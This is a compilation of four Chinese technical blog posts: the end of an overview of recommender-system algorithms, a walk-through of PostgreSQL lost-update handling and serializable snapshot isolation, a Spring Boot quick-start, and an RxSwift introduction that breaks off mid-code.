业内比较传统的算法，主要是CF[1][2]、基于统计的Contextual推荐和LBS，但近期来深度学习被广泛引入，算法性取得较大的提升，如：2015年Netflix和Gravity R&D Inc提出的利用RNN的Session-based推荐[5]，2016年Recsys上提出的结合CNN和PMF应用于Context-aware推荐[10]，2016年Google提出的将DNN作为MF的推广，可以很容易地将任意连续和分类特征添加到模型中[9]，2017年IJCAI会议中提出的利用LSTM进行序列推荐[6]。2017年携程个性化团队在AAAI会议上提出的深度模型aSDAE，通过将附加的side information集成到输入中，可以改善数据稀疏和冷启动问题[4]。
对于召回阶段得到的候选集，会对其进行更加复杂和精确的打分与重排序，进而得到一个更小的用户可能感兴趣的产品列表。携程的推荐排序并不单纯追求点击率或者转化率，还需要考虑距离控制，产品质量控制等因素。相比适用于搜索排序，文本相关性检索等领域的pairwise和listwise方法，pointwise方法可以通过叠加其他控制项进行干预，适用于多目标优化问题。
工业界的推荐方法经历从线性模型＋大量人工特征工程[11] -> 复杂非线性模型-> 深度学习的发展。Microsoft首先于2007年提出采用Logistic Regression来预估搜索广告的点击率[12]，并于同年提出OWLQN优化算法用于求解带L1正则的LR问题[13]，之后于2010年提出基于L2正则的在线学习版本Ad Predictor[14]。
Google在2013年提出基于L1正则化的LR优化算法FTRL-Proximal[15]。2010年提出的Factorization Machine算法[17]和进一步2014年提出的Filed-aware Factorization Machine[18]旨在解决稀疏数据下的特征组合问题，从而避免采用LR时需要的大量人工特征组合工作。
阿里于2011年提出Mixture of Logistic Regression直接在原始空间学习特征之间的非线性关系[19]。Facebook于2014年提出采用GBDT做自动特征组合，同时融合Logistic Regression[20]。
近年来，深度学习也被成功应用于推荐排序领域。Google在2016年提出wide and deep learning方法[21]，综合模型的记忆和泛化能力。进一步华为提出DeepFM[15]模型用于替换wdl中的人工特征组合部分。阿里在2017年将attention机制引入，提出Deep Interest Network[23]。
携程在实践相应的模型中积累了一定的经验，无论是最常用的逻辑回归模型（Logistic Regression），树模型（GBDT，Random Forest）[16]，因子分解机（FactorizationMachine），以及近期提出的wdl模型。同时，我们认为即使在深度学习大行其道的今下，精细化的特征工程仍然是不可或缺的。
基于排序后的列表，在综合考虑多样性、新颖性、Exploit & Explore等因素后，生成最终的推荐结果。
四、总结
之前没有接触过推荐系统，现在由于工作需要开始接触这块内容。很多概念和技术不懂，需要补很多东西。近期也去参加了内部推荐大赛真实地操作了一轮，同时开始学习推荐系统的基础知识，相关架构等，为下一步工作打下必要的基础。
推荐系统是能在几乎所有产品中存在的载体，它几乎可以无延时地以用户需求为导向，来满足用户。其代表的意义和效率，远远超过传统模式。毋庸置疑，牛逼的推荐系统就是未来。但这里有个难点就在于，推荐系统是否做得足够的好。而从目前来看，推荐算法和推荐系统并没有达到人们的预期。因为人的需求是极难猜测的。
又想到之前知乎看到一篇文章，说的是国内很多互联网公司都有的运营岗位，在国外是没有专设这个岗位的。还记得作者分析的较突出原因就是：外国人比较规矩，生活和饮食较单调，例如高兴了都点披萨。而中国不一样，从千千万万的菜品就能管中窥豹，国人的爱好极其广泛，众口难调。加上国外人工时很贵，那么利用算法去拟合用户的爱好和需求，自动地去挖掘用户需求，进行下一步的深耕和推荐就是一个替代方案。这也是国外很推崇推荐系统的侧面原因。而在中国，人相对来说是便宜的，加上国人的口味更多更刁钻，算法表现不好，所以会设很多专门的运营岗位。但慢慢也开始意识到这将是一个趋势，加上最近ai大热，各家大厂都在这块不断深耕。
回到推荐系统上，从现实中客观的原因就可以看到，真正能拟合出用户的需求和爱好确实是很困难的事情。甚至有时候用户都不知道自己想要的是啥，作为中国人，没有主见和想法是正常的，太有主见是违背标准答案的。但推荐系统背后代表的意义是：你的产品知道用户的兴趣，能满足用户的兴趣，那么必定用户就会离不开你。用户离不开的产品，肯定会占领市场，肯定就有极高的估值和想象空间。这也就是大家都在做推荐系统，虽然用起来傻傻的，效果也差强人意，依然愿意大力投入的根本原因。
几句胡诌，前期学习过后的简单总结，自己还有很多东西和细节需要继续学习和研究。能力有限，文中不妥之处还请指正~
（ps：文中一些截图和文字的版权归属原作者，且均已标注引用资料来源地址，本文只是学习总结之用，如有侵权，联系我删除）

问答
推荐系统如何实现精准推荐？
相关阅读
推荐系统基础知识储备
量化评估推荐系统效果
基于用户画像的实时异步化视频推荐系统
【每日课程推荐】机器学习实战！快速入门在线广告业务及CTR相应知识

此文已由作者授权腾讯云+社区发布，更多原文请点击
搜索关注公众号「云加社区」，第一时间获取技术干货，关注后回复1024 送你一份技术课程大礼包！
海量技术实践经验，尽在云加社区！

********************************************************************************************************************************************************************************************************
浅析Postgres中的并发控制(Concurrency Control)与事务特性(下)
上文我们讨论了PostgreSQL的MVCC相关的基础知识以及实现机制。关于PostgreSQL中的MVCC，我们只讲了元组可见性的问题，还剩下两个问题没讲。一个是"Lost Update"问题，另一个是PostgreSQL中的序列化快照隔离机制(SSI，Serializable Snapshot Isolation)。今天我们就来继续讨论。

3.2 Lost Update
所谓"Lost Update"就是写写冲突。当两个并发事务同时更新同一条数据时发生。"Lost Update"必须在REPEATABLE READ 和 SERIALIZABLE 隔离级别上被避免，即拒绝并发地更新同一条数据。下面我们看看在PostgreSQL上如何处理"Lost Update"
有关PostgreSQL的UPDATE操作，我们可以看看ExecUpdate()这个函数。然而今天我们不讲具体的函数，我们形而上一点。只从理论出发。我们只讨论下UPDATE执行时的情形，这意味着，我们不讨论什么触发器啊，查询重写这些杂七杂八的，只看最"干净"的UPDATE操作。而且，我们讨论的是两个并发事务的UPDATE操作。
请看下图，下图显示了两个并发事务中UPDATE同一个tuple时的处理。


[1]目标tuple处于正在更新的状态

我们看到Tx_A和Tx_B在并发执行，Tx_A先更新了tuple，这时Tx_B准备去更新tuple，发现Tx_A更新了tuple，但是还没有提交。于是，Tx_B处于等待状态，等待Tx_A结束(commit或者abort)。
当Tx_A提交时，Tx_B解除等待状态，准备更新tuple，这时分两个情况：如果Tx_B的隔离级别是READ COMMITTED，那么OK，Tx_B进行UPDATE(可以看出，此时发生了Lost Update)。如果Tx_B的隔离级别是REPEATABLE READ或者是SERIALIZABLE，那么Tx_B会立即被abort，放弃更新。从而避免了Lost Update的发生。
当Tx_A和Tx_B的隔离级别都为READ COMMITTED时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED;START TRANSACTIONpostgres=# update test set b = b+1;↓↓this transaction is being blocked↓UPDATE 1



当Tx_A的隔离级别为READ COMMITTED，Tx_B的隔离级别为REPEATABLE READ时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL REPEATABLE READ;START TRANSACTIONpostgres=# update test set b = b+1;↓↓this transaction is being blocked↓ERROR:couldn't serialize access due to concurrent update




[2]目标tuple已经被并发的事务更新

我们看到Tx_A和Tx_B在并发执行，Tx_A先更新了tuple并且已经commit，Tx_B再去更新tuple时发现它已经被更新过了并且已经提交。如果Tx_B的隔离级别是READ COMMITTED，根据我们前面说的，，Tx_B在执行UPDATE前会重新获取snapshot，发现Tx_A的这次更新对于Tx_B是可见的，因此Tx_B继续更新Tx_A更新过得元组(Lost Update)。而如果Tx_B的隔离级别是REPEATABLE READ或者是SERIALIZABLE，那么显然我们会终止当前事务来避免Lost Update。
当Tx_A的隔离级别为READ COMMITTED，Tx_B的隔离级别为REPEATABLE READ时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL REPEATABLE READ;START TRANSACTIONpostgres=# select * from test ; a b---+--- 1 5(1 row)postgres=# update test set b = b+1ERROR: could not serialize access due to concurrent update




[3]更新无冲突

这个很显然，没有冲突就没有伤害。Tx_A和Tx_B照常更新，不会有Lost Update。
从上面我们也可以看出，在使用SI(Snapshot Isolation)机制时，两个并发事务同时更新一条记录时，先更新的那一方获得更新的优先权。但是在下面提到的SSI机制中会有所不同，先提交的事务获得更新的优先权。

3.3 SSI(Serializable Snapshot Isolation)
SSI，可序列化快照隔离，是PostgreSQL在9.1之后，为了实现真正的SERIALIZABLE(可序列化)隔离级别而引入的。
对于SERIALIZABLE隔离级别，官方介绍如下：
可序列化隔离级别提供了最严格的事务隔离。这个级别为所有已提交事务模拟序列事务执行；就好像事务被按照序列一个接着另一个被执行，而不是并行地被执行。但是，和可重复读级别相似，使用这个级别的应用必须准备好因为序列化失败而重试事务。事实上，这个隔离级别完全像可重复读一样地工作，除了它会监视一些条件，这些条件可能导致一个可序列化事务的并发集合的执行产生的行为与这些事务所有可能的序列化（一次一个）执行不一致。这种监控不会引入超出可重复读之外的阻塞，但是监控会产生一些负荷，并且对那些可能导致序列化异常的条件的检测将触发一次序列化失败。
讲的比较繁琐，我的理解是：
1.只针对隔离级别为SERIALIZABLE的事务；
2.并发的SERIALIZABLE事务与按某一个顺序单独的一个一个执行的结果相同。
条件1很好理解，系统只判断并发的SERIALIZABLE的事务之间的冲突；
条件2我的理解就是并发的SERIALIZABLE的事务不能同时修改和读取同一个数据，否则由并发执行和先后按序列执行就会不一致。
但是这个不能同时修改和读取同一个数据要限制在多大的粒度呢？
我们分情况讨论下。

[1] 读写同一条数据

似乎没啥问题嘛，根据前面的论述，这里的一致性在REPEATABLE READ阶段就保证了，不会有问题。
以此类推，我们同时读写2,3,4....n条数据，没问题。

[2]读写闭环

啥是读写闭环？这我我造的概念，类似于操作系统中的死锁，即事务Tx_A读tuple1，更新tuple2，而Tx_B恰恰相反，读tuple2， 更新tuple1.
我们假设事务开始前的tuple1，tuple2为tuple1_1，tuple2_1,Tx_A和Tx_B更新后的tuple1，tuple2为tuple1_2，tuple2_2。
这样在并发下：
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_1。
同理，Tx_B读到的tuple1是tuple1_1，tuple2是tuple2_1。
而如果我们以Tx_A，Tx_B的顺序串行执行时，结果为：
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_1。
Tx_B读到的tuple1是tuple1_2(被Tx_A更新了)，tuple2是tuple2_1。
反之，而如果我们以Tx_B，Tx_A的顺序串行执行时，结果为：
Tx_B读到的tuple1是tuple1_1，tuple2是tuple2_1。
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_2(被Tx_B更新了)。

可以看出，这三个结果都不一样，不满足条件2，即并发的Tx_A和Tx_B不能被模拟为Tx_A和Tx_B的任意一个序列执行，导致序列化失败。
其实我上面提到的读写闭环，更正式的说法是：序列化异常。上面说的那么多，其实下面两张图即可解释。

关于这个*-conflicts我们遇到好几个了。我们先总结下：
wr-conflicts (Dirty Reads)
ww-conflicts (Lost Updates)
rw-conflicts (serialization anomaly)
下面说的SSI机制，就是用来解决rw-conflicts的。
好的，下面就开始说怎么检测这个序列化异常问题，也就是说，我们要开始了解下SSI机制了。
在PostgreSQL中，使用以下方法来实现SSI：

利用SIREAD LOCK(谓词锁)记录每一个事务访问的对象(tuple、page和relation)；
在事务写堆表或者索引元组时利用SIREAD LOCK监测是否存在冲突；
如果发现到冲突(即序列化异常)，abort该事务。

从上面可以看出，SIREAD LOCK是一个很重要的概念。解释了这个SIREAD LOCK，我们也就基本上理解了SSI。
所谓的SIREAD LOCK，在PostgreSQL内部被称为谓词锁。他的形式如下：
SIREAD LOCK := { tuple|page|relation, {txid [, ...]} }
也就是说，一个谓词锁分为两个部分：前一部分记录被"锁定"的对象(tuple、page和relation)，后一部分记录同时访问了该对象的事务的virtual txid(有关它和txid的区别，这里就不做多介绍了)。
SIREAD LOCK的实现在函数CheckForSerializableConflictOut中。该函数在隔离级别为SERIALIZABLE的事务中发生作用，记录该事务中所有DML语句所造成的影响。
例如，如果txid为100的事务读取了tuple_1，则创建一个SIREAD LOCK为{tuple_1, {100}}。此时，如果另一个txid为101的事务也读取了tuple_1，则该SIREAD LOCK升级为{tuple_1, {100，101}}。需要注意的是如果在DML语句中访问了索引，那么索引中的元组也会被检测，创建对应的SIREAD LOCK。
SIREAD LOCK的粒度分为三级：tuple|page|relation。如果同一个page中的所有tuple都被创建了SIREAD LOCK，那么直接创建page级别的SIREAD LOCK，同时释放该page下的所有tuple级别的SIREAD LOCK。同理，如果一个relation的所有page都被创建了SIREAD LOCK，那么直接创建relation级别的SIREAD LOCK，同时释放该relation下的所有page级别的SIREAD LOCK。
当我们执行SQL语句使用的是sequential scan时，会直接创建一个relation 级别的SIREAD LOCK，而使用的是index scan时，只会对heap tuple和index page创建SIREAD LOCK。
同时，我还是要说明的是，对于index的处理时，SIREAD LOCK的最小粒度是page，也就是说你即使只访问了index中的一个index tuple，该index tuple所在的整个page都被加上了SIREAD LOCK。这个特性常常会导致意想不到的序列化异常，我们可以在后面的例子中看到。
有了SIREAD LOCK的概念，我们现在使用它来检测rw-conflicts。
所谓rw-conflicts，简单地说，就是有一个SIREAD LOCK，还有分别read和write这个SIREAD LOCK中的对象的两个并发的Serializable事务。
这个时候，另外一个函数闪亮登场：CheckForSerializableConflictIn()。每当隔离级别为Serializable事务中执行INSERT/UPDATE/DELETE语句时，则调用该函数判断是否存在rw-conflicts。
例如，当txid为100的事务读取了tuple_1，创建了SIREAD LOCK ： {tuple_1, {100}}。此时，txid为101的事务更新tuple_1。此时调用CheckForSerializableConflictIn()发现存在这样一个状态： {r=100, w=101, {Tuple_1}}。显然，检测出这是一个rw-conflicts。
下面是举例时间。
首先，我们有这样一个表：
testdb=# CREATE TABLE tbl (id INT primary key, flag bool DEFAULT false);
testdb=# INSERT INTO tbl (id) SELECT generate_series(1,2000);
testdb=# ANALYZE tbl;
并发执行的Serializable事务像下面那样执行：

假设所有的SQL语句都走的index scan。这样，当SQL语句执行时，不仅要读取对应的heap tuple，还要读取heap tuple 对应的index tuple。如下图：

执行状态如下：
T1: Tx_A执行SELECT语句，该语句读取了heap tuple(Tuple_2000)和index page(Pkey2);
T2: Tx_B执行SELECT语句，该语句读取了heap tuple(Tuple_1)和index page(Pkey1);
T3: Tx_A执行UPDATE语句，该语句更新了Tuple_1;
T4: Tx_B执行UPDATE语句，该语句更新了Tuple_2000;
T5: Tx_A commit;
T6: Tx_B commit; 由于序列化异常，commit失败，状态为abort。
这时我们来看一下SIREAD LOCK的情况。

T1: Tx_A执行SELECT语句，调用CheckForSerializableConflictOut()创建了SIREAD LOCK：L1={Pkey_2,{Tx_A}} 和 L2={Tuple_2000,{Tx_A}};
T2: Tx_B执行SELECT语句，调用CheckForSerializableConflictOut创建了SIREAD LOCK：L3={Pkey_1,{Tx_B}} 和 L4={Tuple_1,{Tx_B}};
T3: Tx_A执行UPDATE语句，调用CheckForSerializableConflictIn()，发现并创建了rw-conflict ：C1={r=Tx_B, w=Tx_A,{Pkey_1,Tuple_1}}。这很显然，因为Tx_B和TX_A分别read和write这两个object。
T4: Tx_A执行UPDATE语句，调用CheckForSerializableConflictIn()，发现并创建了rw-conflict ：C1={r=Tx_A, w=Tx_B,{Pkey_2,Tuple_2000}}。到这里，我们发现C1和C2构成了precedence graph中的一个环。因此，Tx_A和Tx_B这两个事务都进入了non-serializable状态。但是由于Tx_A和Tx_B都未commit,因此CheckForSerializableConflictIn()并不会abort Tx_B(为什么不abort Tx_A？因此PostgreSQL的SSI机制中采用的是first-committer-win，即发生冲突后，先提交的事务保留，后提交的事务abort。)
T5: Tx_A commit;调用PreCommit_CheckForSerializationFailure()函数。该函数也会检测是否存在序列化异常。显然此时Tx_A和Tx_B处于序列化冲突之中，而由于发现Tx_B仍然在执行中，所以，允许Tx_A commit。
T6: Tx_B commit; 由于序列化异常，且和Tx_B存在序列化冲突的Tx_A已经被提交。因此commit失败，状态为abort。
更多更复杂的例子，可以参考这里.
前面在讨论SIREAD LOCK时，我们谈到对于index的处理时，SIREAD LOCK的最小粒度是page。这个特性会导致意想不到的序列化异常。更专业的说法是"False-Positive Serialization Anomalies"。简而言之实际上并没有发生序列化异常，但是我们的SSI机制不完善，产生了误报。
下面我们来举例说明。

对于上图，如果SQL语句走的是sequential scan，情形如下：

如果是index scan呢？还是有可能出现误报：


这篇就是这样。依然还是有很多问题没有讲清楚。留待下次再说吧(拖延症晚期)。

********************************************************************************************************************************************************************************************************
构建微服务：快速搭建Spring Boot项目
Spring Boot简介：
       Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者（官网介绍）。
 
Spring Boot特点：
       1. 创建独立的Spring应用程序
       2. 嵌入的Tomcat，无需部署WAR文件
       3. 简化Maven配置
       4. 自动配置Spring
       5. 提供生产就绪型功能，如指标，健康检查和外部配置
       6. 绝对没有代码生成并且对XML也没有配置要求
 
 
快速入门：
       1、访问http://start.spring.io/
       2、填写相关的项目信息、jdk版本等（可参考下图）
    
       3、点击Generate Project，就会生成一个maven项目的压缩包，下载项目压缩包
       4、解压后，使用eclipse，Import -> Existing Maven Projects -> Next ->选择解压后的文件夹-> Finsh
 
项目结构介绍：
       如下图所示，Spring Boot的基础结构共三个文件：
       
       src/main/java  --程序开发以及主程序入口
       src/main/resources --配置文件
       src/test/java  --测试程序
 
 
Spring Boot推荐的项目结构：
       根目录：com.example.myproject  
       1）domain：实体类（com.example.domain）
       2）Dao：数据访问层（com.example.repository）
       3）Service：数据服务接口层（com.example.service）
            ServiceImpl：数据服务实现层（com.example.service.impl）
       4）Controller：前端控制器（com.example.controller）
       5）utils：工具类（com.example.utils）
       6）constant：常量接口类（com.example.constant）
       7）config：配置信息类（com.example.config）
       8）dto：数据传输对象（Data Transfer Object，用于封装多个实体类（domain）之间的关系，不破坏原有的实体类结构）（com.example.dto）
       9）vo：视图包装对象（View Object，用于封装客户端请求的数据，防止部分数据泄露，保证数据安全，不破坏原有的实体类结构）（com.example.vo）
 
 
引入Web模块：
       在pom.xml添加支持Web的模块

1 <dependency>
2     <groupId>org.springframework.boot</groupId>
3     <artifactId>spring-boot-starter-web</artifactId>
4 </dependency>

 
运行项目：
       1、创建controller  

 1 package com.example.annewebsite_server.controller;
 2 
 3 import org.springframework.web.bind.annotation.GetMapping;
 4 import org.springframework.web.bind.annotation.RestController;
 5 
 6 @RestController
 7 public class HelloController {
 8     @GetMapping("/hello")
 9     public String say(){
10         return "Hello Spring Boot!";
11     }
12 }

        
       
       2、启动项目入口
       
 
 
       3、项目启动成功
       
 
       4、在浏览器中进行访问（http://localhost:8080/hello）
       
       以上是一个Spring Boot项目的搭建过程，希望能够给正在学习Spring Boot的同仁带来一些些帮助，不足之处，欢迎指正。
 

********************************************************************************************************************************************************************************************************
RxSwift 入门
ReactiveX 是一个库，用于通过使用可观察序列来编写异步的、基于事件的程序。
它扩展了观察者模式以支持数据、事件序列，并添加了允许你以声明方式组合序列的操作符，同时抽象对低层线程、同步、线程安全等。
本文主要作为 RxSwift 的入门文章，对 RxSwift 中的一些基础内容、常用实践，做些介绍。
本文地址为：https://www.cnblogs.com/xjshi/p/9755095.html，转载请注明出处。
Observables aka Sequences
Basics
观察者模式（这里指Observable(Element> Sequence)和正常序列（Sequence)的等价性对于理解 Rx 是相当重要的。
每个 Observable 序列只是一个序列。Observable 与 Swift 的 Sequence 相比，其主要优点是可以异步接收元素。这是 RxSwift 的核心。

Observable(ObservableType) 与 Sequence 等价
Observable.subscribe 方法与 Sequence.makeIterator方法等价
Observer（callback）需要被传递到 Observable.subscribe 方法来接受序列元素，而不是在返回的 iterator 上调用 next() 方法

Sequence 是一个简单、熟悉的概念，很容易可视化。
人是具有巨大视觉皮层的生物。当我们可以轻松地想想一个概念时，理解它就容易多了。
我们可以通过尝试模拟每个Rx操作符内的事件状态机到序列上的高级别操作来接触认知负担。
如果我们不使用 Rx 而是使用模型异步系统（model asynchronous systems），这可能意味着我们的代码会充满状态机和瞬态，这些正式我们需要模拟的，而不是抽象。
List 和 Sequence 可能是数学家和程序员首先学习的概念之一。
这是一个数字的序列：
--1--2--3--4--5--6--|   // 正常结束
另一个字符序列：
--a--b--a--a--a---d---X     // terminates with error
一些序列是有限的，而一些序列是无限的，比如一个按钮点击的列：
---tap-tap-------tap--->
这些被叫做 marble diagram。可以在rxmarbles.com了解更多的 marble diagram。
如果我们将序列愈发指定为正则表达式，它将如下所示：
next*(error | completed)?
这描述了以下内容：

Sequence 可以有 0 个 或者多个元素
一旦收到 error 或 completed 事件，这个 Sequence 就不能再产生其他元素

在 Rx 中， Sequence 被描述为一个 push interface（也叫做 callbak）。
enum Event<Element>  {
    case next(Element)      // next element of a sequence
    case error(Swift.Error) // sequence failed with error
    case completed          // sequence terminated successfully
}

class Observable<Element> {
    func subscribe(_ observer: Observer<Element>) -> Disposable
}

protocol ObserverType {
    func on(_ event: Event<Element>)
}
当序列发送 error 或 completed 事件时，将释放计算序列元素的所有内部资源。
要立即取消序列元素的生成，并释放资源，可以在返回的订阅（subscription）上调用 dispose。
如果一个序列在有限时间内结束，则不调用 dispose 或者不使用 disposed(by: disposeBag) 不会造成任何永久性资源泄漏。但是，这些资源会一直被使用，直到序列完成（完成产生元素，或者返回一个错误）。
如果一个序列没有自行终止，比如一系列的按钮点击，资源会被永久分配，直到 dispose 被手动调用（在 disposeBag 内调用，使用 takeUntil 操作符，或者其他方式）。
使用 dispose bag 或者 takeUtil 操作符是一个确保资源被清除的鲁棒（robust）的方式。即使序列将在有限时间内终止，我们也推荐在生产环境中使用它们。
Disposing
被观察的序列（observed sequence）有另一种终止的方式。当我们使用完一个序列并且想要释放分配用于计算即将到来的元素的所有资源时，我们可以在一个订阅上调用 dispose。
这时一个使用 interval 操作符的例子：
let scheduler = SerialDispatchQueueScheduler(qos: .default)
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
    .subscribe { event in
        print(event)
    }

Thread.sleep(forTimeInterval: 2.0)

subscription.dispose()
上边的例子打印：
0
1
2
3
4
5
注意，你通常不希望调用 dispose，这只是一个例子。手动调用 dispose 通常是一种糟糕的代码味道。dispose 订阅有更好的方式，比如 DisposeBag、takeUntil操作符、或者一些其他的机制。
那么，上边的代码是否可以在 dispose 被执行后，打印任何东西？答案是，是情况而定。

如果上边的 scheduler 是串行调度器（serial scheduler），比如 MainScheduler ，dispose 在相同的串行调度器上调用，那么答案就是 no。
否则，答案是 yes。

你仅仅有两个过程在并行执行。

一个在产生元素
另一个 dispose 订阅

“可以在之后打印某些内容吗？”这个问题，在这两个过程在不同调度上执行的情况下甚至没有意义。
如果我们的代码是这样的：
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
            .observeOn(MainScheduler.instance)
            .subscribe { event in
                print(event)
            }

// ....

subscription.dispose() // called from main thread
在 dispose 调用返回后，不会打印任何东西。
同样，在这个例子中：
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
            .observeOn(serialScheduler)
            .subscribe { event in
                print(event)
            }

// ...

subscription.dispose() // executing on same `serialScheduler`
在 dispose 调用返回后，也不会打印任何东西。
Dispose Bag

Dispose bags are used to return ARC like behavior to RX.

当一个 DisposeBag 被释放时，它会在每一个可被 dispose 的对象（disposables）上调用 dispose。
它没有 dispose 方法，因此不允许故意显式地调用 dispose。如果需要立即清理，我们可以创建一个新的 DisposeBag。
self.disposeBag = DisposeBag()
这将清除旧的引用，并引起资源清理。
如果仍然需要手动清理，可以使用 CompositeDisposable。它具有所需的行为，但一旦调用了 dispose 方法，它将立即处理任何新添加可被dispose的对象（disposable）。
Take until
另一种在 dealloc 时自动处理（dispose）订阅的方式是使用 takeUtil 操作符。
sequence
    .takeUntil(self.rx.deallocated)
    .subscribe {
        print($0)
    }

Implicit Observable guarantees
还有一些额外的保证，所有的序列产生者（sequence producers、Observable s），必须遵守.
它们在哪一个线程上产生元素无关紧要，但如果它们生成一个元素并发送给观察者observer.on(.next(nextElement))，那么在 observer.on 方法执行完成前，它们不能发送下一个元素。
如果 .next 事件还没有完成，那么生产者也不能发送终止 .completed 或 .error 。
简而言之，考虑以下示例：
someObservable
  .subscribe { (e: Event<Element>) in
      print("Event processing started")
      // processing
      print("Event processing ended")
  }
它始终打印：
Event processing started
Event processing ended
Event processing started
Event processing ended
Event processing started
Event processing ended
它永远无法打印：
Event processing started
Event processing started
Event processing ended
Event processing ended
Creating your own Observable (aka observable sequence)
关于观察者有一个重要的事情需要理解。
创建 observable 时，它不会仅仅因为它已创建而执行任何工作。
确实，Observable 可以通过多种方式产生元素。其中一些会导致副作用，一些会影响现有的运行过程，例如点击鼠标事件等。
但是，如果只调用一个返回 Observable 的方法，那么没有序列生成，也没有副作用。Observable仅仅定义序列的生成方法以及用于元素生成的参数。序列生成始于 subscribe 方法被调用。
例如，假设你有一个类似原型的方法：
func searchWikipedia(searchTerm: String) -> Observable<Results> {}
let searchForMe = searchWikipedia("me")

// no requests are performed, no work is being done, no URL requests were fired

let cancel = searchForMe
  // sequence generation starts now, URL requests are fired
  .subscribe(onNext: { results in
      print(results)
  })
有许多方法可以生成你自己的 Observable 序列，最简单方法或许是使用 create 函数。
RxSwift 提供了一个方法可以创建一个序列，这个序列订阅时返回一个元素。这个方法是 just。我们亲自实现一下：
func myJust<E>(_ element: E) -> Observable<E> {
    return Observable.create { observer in
        observer.on(.next(element))
        observer.on(.completed)
        return Disposables.create()
    }
}

myJust(0)
    .subscribe(onNext: { n in
      print(n)
    })
这会打印：
0
不错，create 函数是什么？
它只是一个便利方法，使你可以使用 Swift 的闭包轻松实现 subscribe 方法。像 subscribe 方法一样，它带有一个参数 observer，并返回 disposable。
以这种方式实现的序列实际上是同步的（synchronous）。它将生成元素，并在 subscribe 调用返回 disposable 表示订阅前终止。因此，它返回的 disposable 并不重要，生成元素的过程不会被中断。
当生成同步序列，通常用于返回的 disposable 是 NopDisposable 的单例。
现在，我们来创建一个从数组中返回元素的 observable。
func myFrom<E>(_ sequence: [E]) -> Observable<E> {
    return Observable.create { observer in
        for element in sequence {
            observer.on(.next(element))
        }

        observer.on(.completed)
        return Disposables.create()
    }
}

let stringCounter = myFrom(["first", "second"])

print("Started ----")

// first time
stringCounter
    .subscribe(onNext: { n in
        print(n)
    })

print("----")

// again
stringCounter
    .subscribe(onNext: { n in
        print(n)
    })

print("Ended ----")
上边的例子会打印：
Started ----
first
second
----
first
second
Ended ----
Creating an Observable that perfroms work
OK，现在更有趣了。我们来创建前边示例中使用的 interval 操作符。
这相当于 dispatch queue schedulers 的实际实现
func myInterval(_ interval: TimeInterval) -> Observable<Int> {
    return Observable.create { observer in
        print("Subscribed")
        let timer = DispatchSource.makeTimerSource(queue: DispatchQueue.global())
        timer.scheduleRepeating(deadline: DispatchTime.now() + interval, interval: interval)

        let cancel = Disposables.create {
            print("Disposed")
            timer.cancel()
        }

        var next = 0
        timer.setEventHandler {
            if cancel.isDisposed {
                return
            }
            observer.on(.next(next))
            next += 1
        }
        timer.resume()

        return cancel
    }
}
let counter = myInterval(0.1)

print("Started ----")

let subscription = counter
    .subscribe(onNext: { n in
        print(n)
    })


Thread.sleep(forTimeInterval: 0.5)

subscription.dispose()

print("Ended ----")
上边的示例会打印：
Started ----
Subscribed
0
1
2
3
4
Disposed
Ended ----
如果这样写：
let counter = myInterval(0.1)

print("Started ----")

let subscription1 = counter
    .subscribe(onNext: { n in
        print("First \(n)")
    })
let subscription2 = counter
    .subscribe(onNext: { n in
        print("Second \(n)")
    })

Thread.sleep(forTimeInterval: 0.5)

subscription1.dispose()

Thread.sleep(forTimeInterval: 0.5)

subscription2.dispose()

print("Ended ----")
那么打印如下：
Started ----
Subscribed
Subscribed
First 0
Second 0
First 1
Second 1
First 2
Second 2
First 3
Second 3
First 4
Second 4
Disposed
Second 5
Second 6
Second 7
Second 8
Second 9
Disposed
Ended ----
订阅后的每个订阅者（subscriber）同行会生成自己独立的元素序列。默认情况下，操作符是无状态的。无状态的操作符远多于有状态的操作符。
Sharing subscription and share operator
但是，如果你希望多个观察者从一个订阅共享事件（元素），该怎么办？
有两件事需要定义:

如何处理在新订阅者有兴趣观察它们之前收到的过去的元素(replay lastest only, replay all, replay last n)
如何决定何时出发共享的订阅（refCount， manual or some other algorithm)

通常是一个这样的组合，replay(1).refCount，也就是 share(replay: 1)。
let counter = myInterval(0.1)
    .share(replay: 1)

print("Started ----")

let subscription1 = counter
    .subscribe(onNext: { n in
        print("First \(n)")
    })
let subscription2 = counter
    .subscribe(onNext: { n in
        print("Second \(n)")
    })

Thread.sleep(forTimeInterval: 0.5)

subscription1.dispose()

Thread.sleep(forTimeInterval: 0.5)

subscription2.dispose()

print("Ended ----")
这将打印：
Started ----
Subscribed
First 0
Second 0
First 1
Second 1
First 2
Second 2
First 3
Second 3
First 4
Second 4
First 5
Second 5
Second 6
Second 7
Second 8
Second 9
Disposed
Ended ----
请注意现在只有一个 Subscribed 和 Disposed 事件。
对 URL 可观察对象（observable）的行为是等效的。
下面的例子展示了如何的 HTTP 请求封装在 Rx 中，这种封装非常像 interval 操作符的模式。
extension Reactive where Base: URLSession {
    public func response(_ request: URLRequest) -> Observable<(Data, HTTPURLResponse)> {
        return Observable.create { observer in
            let task = self.dataTaskWithRequest(request) { (data, response, error) in
                guard let response = response, let data = data else {
                    observer.on(.error(error ?? RxCocoaURLError.Unknown))
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    observer.on(.error(RxCocoaURLError.nonHTTPResponse(response: response)))
                    return
                }

                observer.on(.next(data, httpResponse))
                observer.on(.completed)
